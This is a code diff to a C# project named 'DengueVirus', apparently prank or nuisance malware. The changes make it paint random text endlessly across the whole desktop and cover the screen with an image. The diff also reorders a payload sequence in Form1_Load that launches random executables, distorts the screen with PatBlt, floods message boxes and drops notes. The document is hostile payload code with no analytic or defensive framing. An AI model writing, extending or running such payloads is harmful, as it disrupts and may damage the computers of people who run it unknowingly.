@@ -206,20 +206,53 @@ namespace DengueVirus
 
         public void DrawTextScreen()
         {
-            Graphics g = this.CreateGraphics();
-            Font f = new Font("Impact", 10);
-            SolidBrush b = new SolidBrush(Color.Red);
-            g.DrawString(GenRandomUnicodeString(10), f, b, 10, 10);
+            IntPtr hdc = GetDC(IntPtr.Zero);
+            using (Graphics g = Graphics.FromHdc(hdc))
+            {
+                Font f = new Font("Impact", 50);
+                Random random = new Random();
+                while (true)
+                {
+                    Brush b = new SolidBrush(Color.FromArgb(random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
+                    g.DrawString(GenRandomUnicodeString(random.Next(5, 15)), f, b, 10, 10);
+                    Thread.Sleep(1);
+                }
+            }
         }
 
-        public void ChangeButtonSize()
+        /*public void ChangeButtonSize()
         {
             while (true)
             {
-                button1.Size = new Size(button1.Size.Width + new Random().Next(-1, 2), button1.Size.Height + new Random().Next(-1, 2));
-                button1.Text = GenRandomUnicodeString(button1.Size.Width);
+                if (button1.InvokeRequired)
+                {
+                    button1.Invoke(new Action(() =>
+                    {
+                        button1.Size = new Size(button1.Size.Width + new Random().Next(-1, 2), button1.Size.Height + new Random().Next(-1, 2));
+                        button1.Text = GenRandomUnicodeString(button1.Size.Width);
+                    }));
+                }
+                else
+                {
+                    button1.Size = new Size(button1.Size.Width + new Random().Next(-1, 2), button1.Size.Height + new Random().Next(-1, 2));
+                    button1.Text = GenRandomUnicodeString(button1.Size.Width);
+                }
                 Thread.Sleep(10);
             }
+        }*/
+
+        public void FillScreen()
+        {
+            //fills the screen with an image from the resources
+            IntPtr hdc = GetDC(IntPtr.Zero);
+            Graphics g = Graphics.FromHdc(hdc);
+            g.InterpolationMode = InterpolationMode.Low;
+            g.CompositingQuality = CompositingQuality.HighSpeed;
+            g.SmoothingMode = SmoothingMode.HighSpeed;
+            g.PixelOffsetMode = PixelOffsetMode.HighSpeed;
+
+            g.DrawImage(Properties.Resources.xd, 0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            g.Dispose();
         }
 
         public void Form1_Load(object sender, EventArgs e)
@@ -237,22 +270,26 @@ namespace DengueVirus
                 Thread.Sleep(1000);
                 Cursor = Cursors.Default;
             }
-
-            SpicyPL.OpenRandomEXE();
-            
             SpicyPL.WriteNote();
 
             Thread.Sleep(12000);
 
+            
+            FillScreen();
+            SpicyPL.OpenRandomEXE();
             Thread t3 = new Thread(PrintRotate); t3.Start();
             Thread t4 = new Thread(Wave); t4.Start();
+            Thread text = new Thread(DrawTextScreen); text.Start();
 
             Thread.Sleep(5000);
-            Thread t5 = new Thread(PatBltpayload); t5.Start();
+
+            text.Abort();
             t3.Abort();
+            Thread t5 = new Thread(PatBltpayload); t5.Start();
             Thread t6 = new Thread(MessageBoxThread); t6.Start();
 
             SpicyPL.UserNote();
+            //Thread aaa = new Thread(ChangeButtonSize); aaa.Start();
 
             Thread.Sleep(5000);
             t5.Abort();
@@ -262,8 +299,6 @@ namespace DengueVirus
             Thread.Sleep(5000);
             t4.Abort();
             SpicyPL.OpenRandomEXE();
-
-            Thread aaa = new Thread(ChangeButtonSize); aaa.Start();
 
             //close form
             //this.Close();
